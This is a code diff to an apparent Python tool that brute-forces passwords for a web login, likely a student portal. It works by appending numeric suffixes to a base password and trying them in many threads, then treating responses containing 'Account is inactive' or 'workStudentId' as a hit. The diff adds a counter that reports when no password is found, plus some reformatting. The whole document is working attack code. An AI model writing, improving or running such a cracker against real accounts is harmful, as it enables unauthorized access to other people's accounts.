@@ -13,6 +13,8 @@ configFile = 'config/config.confnose'
 DEBUG = True
 COLOR = True
 
+complete   = 0
+threads    = 0
 ColorCodes = {'black': '30', 'red': '31', 'yellow': '33', 'green': '32', 'blue': '34',
               'cyan': '36', 'magenta': '35', 'white': '37', 'gray': '90', 'reset': '0'}
 
@@ -74,6 +76,7 @@ class check(threading.Thread):
 
     # Do the cracking :)
     def run(self):
+        global complete
         for i in range(self.startIndex, self.endIndex):
             # Genarate the password to try (EX: 305725)
             toTry = self.pWord + (str(i).zfill(len(str(self.pWordIta))))
@@ -93,14 +96,15 @@ class check(threading.Thread):
             # Check if is correct password
             if not "Account is inactive" in data.text and not "workStudentId" in data.text:
                 continue
-            DebugPrint(
-                "Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
+            DebugPrint("Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
             os._exit(0)
+        complete += 1
 
 ####### MAIN FUNCTION #######
 
 
 def main():
+    global threads
     # Read Configvalues from the config file and assign them to vars
     DebugPrint('Main', 'Starting...', 'green')
     try:
@@ -118,23 +122,22 @@ def main():
         DebugPrint('Main', 'Problem with your Config file :/', 'red')
         os._exit(-1)
 
-    DebugPrint(
-        "Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
+    DebugPrint("Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
 
     # Create threads to check for the password
     for i in range(threads):
         startIndex = int((pWordIta/threads - 1))
         endIndex = pWordIta if i == threads - 1 else startIndex * (i + 1)
-        t = check(i, url, checkUrl, pWordIta, pWord, uName,
-                  timeout, startTime, startIndex * i, endIndex)
+        t = check(i, url, checkUrl, pWordIta, pWord, uName, timeout, startTime, startIndex * i, endIndex)
         t.daemon = True
         t.start()
 
 
 if __name__ == "__main__":
-    try:
-        main()
-        while True:
-            continue
-    except:
-        DebugPrint('Main', 'Exiting...', 'red')
+    try: main()
+    except: DebugPrint('Main', 'Exiting...', 'red')
+    while True:
+        if complete >= threads:
+            DebugPrint('Main', 'No Paswsword Found 😢', 'red')
+            break
+        continue
